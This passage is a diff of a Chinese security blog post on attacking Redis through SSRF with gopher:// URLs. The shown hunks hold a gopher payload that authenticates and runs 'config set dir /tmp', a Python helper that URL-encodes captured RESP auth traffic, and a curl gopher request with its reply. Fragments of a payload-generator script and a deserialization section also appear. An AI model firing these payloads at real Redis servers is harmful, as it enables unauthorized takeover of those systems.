+<p><img src="https://img-blog.csdnimg.cn/9575ef6a78d74b6e8cb30961f9fc9395.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>Gopherus没有集成怎么主从复制的利用。简单分析下他的原理</p>
+<p><img src="https://img-blog.csdnimg.cn/5d429f219e4e469fa2a66a17027456cd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到这个伪造的是resp协议来交互(这个不打算展开,后面源码分析利用的时候会说明的)</p>
 <p>其实这里我们也可以将gopher伪造成dict的协议(直接采用简单协议格式)来一段一段地请求。</p>
 <pre class=" language-java"><code class="language-java">gopher<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">/</span>_auth<span class="token operator">%</span><span class="token number">20123123</span><span class="token operator">%</span><span class="token number">0d</span><span class="token operator">%</span>0aconfig<span class="token operator">%</span>20set<span class="token operator">%</span>20dir<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>tmp<span class="token operator">/</span><span class="token operator">%</span><span class="token number">0d</span><span class="token operator">%</span>0aquit
 </code></pre>
@@ -702,8 +643,8 @@ curl dict<span class="token operator">:</span><span class="token operator">/</sp
 <pre class=" language-java"><code class="language-java">docker cp cbdaed8<span class="token operator">:</span><span class="token operator">/</span>redisPort<span class="token punctuation">.</span>pcap <span class="token punctuation">.</span>/redisPort<span class="token punctuation">.</span>pcap
 </code></pre>
 <p>直接follow tcp stream</p>
-<p><img src="https://img-blog.csdnimg.cn/bd22244fbd6e41f2baca2acb43f53ac0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到这个验证过程其实也是可以伪造的。</p>
-<p><img src="https://img-blog.csdnimg.cn/fa42033da39f481a88b102972a77f010.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>提取这段出来然后url编码就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/bd22244fbd6e41f2baca2acb43f53ac0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以看到这个验证过程其实也是可以伪造的。</p>
+<p><img src="https://img-blog.csdnimg.cn/fa42033da39f481a88b102972a77f010.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>提取这段出来然后url编码就行了</p>
 <pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
 str_ <span class="token operator">=</span> <span class="token string">"2a 32 0d 0a 24 34 0d 0a 61 75 74 68 0d 0a 24 36 0d 0a 31 32 33 31 32 33  0d 0a"</span>
 str__ <span class="token operator">=</span> str_<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
@@ -716,7 +657,7 @@ okStr <span class="token operator">=</span> <span class="token string">""</span>
 <pre class=" language-java"><code class="language-java">curl <span class="token string">"gopher://127.0.0.1:6383/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24%36%0d%0a%31%32%33%31%32%33%%0d%0a"</span>
 <span class="token operator">+</span>OK
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/e37b2b4526b04e3fa2c0b0f08af396db.png" alt="在这里插入图片描述"><br>Redis支持管道流水线，所以可以一次性拼接命令发送，不需要回复请求。</p>
+<p><img src="https://img-blog.csdnimg.cn/e37b2b4526b04e3fa2c0b0f08af396db.png"><br>Redis支持管道流水线，所以可以一次性拼接命令发送，不需要回复请求。</p>
 <p>所以我们只需要在开头拼接下这段验证就行了。</p>
 <h2 id="0x4-4-通用利用脚本"><a href="#0x4-4-通用利用脚本" class="headerlink" title="0x4.4 通用利用脚本"></a>0x4.4 通用利用脚本</h2><p>这里我自己改了个比较简单的python3的payload生成脚本。</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span>
@@ -779,7 +720,7 @@ okStr <span class="token operator">=</span> <span class="token string">""</span>
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
     main<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
-<p><img src="https://img-blog.csdnimg.cn/448591b9a753482d828386496035d304.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>如果有认证的话,添加到authPass变量即可。</p>
+<p><img src="https://img-blog.csdnimg.cn/448591b9a753482d828386496035d304.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16"><br>如果有认证的话,添加到authPass变量即可。</p>
 <h2 id="0x4-5-redis触发反序列化"><a href="#0x4-5-redis触发反序列化" class="headerlink" title="0x4.5 redis触发反序列化"></a>0x4.5 redis触发反序列化</h2><p>这种场景主要是redis里面存储的内容，最终会被程序反序列化，从而导致触发处反序列化漏洞。</p>
 <p>我们平时做题目的时候一般序列化内容都被base64了，所以没遇到什么坑。但是如果是原生的序列化数据就会有协议无法传输特殊字符的坑。</p>
 <p>不过gopher是无敌的，双重编码就行了。</p>
